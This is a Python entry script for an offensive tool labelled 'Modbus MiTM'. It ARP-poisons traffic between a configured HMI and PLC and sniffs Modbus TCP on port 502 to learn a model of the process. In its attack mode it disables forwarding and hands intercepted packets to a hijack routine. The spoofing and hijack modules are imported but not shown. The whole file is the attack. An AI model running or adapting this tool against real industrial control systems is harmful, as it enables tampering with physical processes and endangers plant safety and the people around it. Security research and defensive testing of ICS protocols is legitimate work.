import os
import sys
from optparse import OptionParser
from tools import network
from tools import arpspoofing
from scripts import hijack
from scripts import learn
from config.defaults import cfg
import logging

MODE = {'MODBUS': 'tcp and port 502',
        }
VERSION = '0.1.1'
PROG = os.path.basename(os.path.splitext(__file__)[0])
logging.basicConfig(format='%(levelname)s - %(asctime)s - %(message)s',
                    datefmt='%d-%b-%y %H:%M:%S',
                    level=logging.INFO)


def opt_parse(args=None):
    description = """Modbus MiTM"""
    parser = OptionParser(usage='usage: %prog [OPTIONS] COMMAND [BLOG_FILE]\n'
                                'Make sure to edit $APP_HOME/config/defaults.py',
                          version='{} {}'.format(PROG, VERSION),
                          description=description)
    parser.add_option("-l", "--learn",
                      action="store",
                      dest="learn",
                      help="learn and interpolate over traffic",
                      default=False)
    parser.add_option("-a", "--attack",
                      action="store_true",
                      dest="attack",
                      help="run attack using learned model",
                      default=False)
    parser.add_option("-m", "--model",
                      action="store",
                      dest="load_model",
                      default=None,
                      help="load saved model")
    parser.add_option("-p", "--plot",
                      action="store_true",
                      dest="plot_model",
                      default=False,
                      help="plot saved model functions")
    parser.add_option("-d", "--discover",
                      dest="discover",
                      help="assets discovery")
    parser.add_option("-L", "--list",
                      dest="list",
                      help="list saved models")

    if len(sys.argv) == 1:
        parser.parse_args(['--help'])

    return parser.parse_args(args) if args else parser.parse_args()


def main():
    (options, args) = opt_parse()
    try:
        network_ = network.Network(cfg.DEVICES.LOCALHOST.NAME)
        learn_ = learn.Model()
        hj_ = hijack.Modbus()
        arpspoof_ = arpspoofing.ArpPoison(cfg.DEVICES.HMI,
                                          cfg.DEVICES.PLC,
                                          cfg.DEVICES.LOCALHOST,
                                          ip_fwd=True)
        # arpspoof_.stop()

        if options.load_model:
            learn_.load_model(options.load_model)

        if options.plot_model:
            learn_.plot_functions()

        if options.learn:
            arpspoof_.start()
            learn_.modbus(network_.sniff(filter=MODE['MODBUS'], timeout=cfg.LEARN_TIME))
            arpspoof_.stop()

        if options.attack:
            hj_.matrix, hj_.functions = learn_.matrix, learn_.functions
            arpspoof_.IP_FWD = False
            try:
                arpspoof_.start()
                while True:
                    network_.callback_sniffer(
                        filter='host {} and host {} and dst port 502'.format(cfg.DEVICES.HMI.IP, cfg.DEVICES.PLC.IP),
                        callback=hj_.pkt_callback)

            except KeyboardInterrupt:
                logging.error("Caught keyboard interrupt, closing...", exc_info=True)
                arpspoof_.stop()
                sys.exit(1)

    except Exception as e:
        logging.error("Error occurred.", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
